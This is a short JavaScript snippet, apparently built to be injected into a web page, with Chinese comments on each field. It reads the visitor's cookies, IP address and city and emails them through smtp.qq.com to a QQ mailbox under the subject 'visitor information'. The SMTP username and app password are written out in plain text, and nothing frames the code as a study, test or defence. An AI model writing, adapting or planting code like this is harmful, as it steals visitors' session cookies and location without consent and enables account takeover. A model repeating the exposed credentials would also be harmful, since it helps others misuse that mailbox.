var s=document.cookie;
var ip=returnCitySN["cip"]+returnCitySN["cname"];
Email.send({
    Host : "smtp.qq.com",  //你所用邮箱的smtp地址
    Username : "1520402908@qq.com",      //你的邮箱用户名（如xxx@qq.com）
    Password : "zixxgjmmubujgdhf",      //你的邮箱密码(之前开通服务的授权码)
    To : '1520402908@qq.com',    //收件人邮箱地址
    From : "1520402908@qq.com",       //发件人邮箱地址
    Subject : "访客信息",  //邮件主题
    Body : "cookie:"+s+"\\\\\\\\\\\\\\\\\\\\\\"+"ip:"+ip  //邮件内容
}).then(
  message
);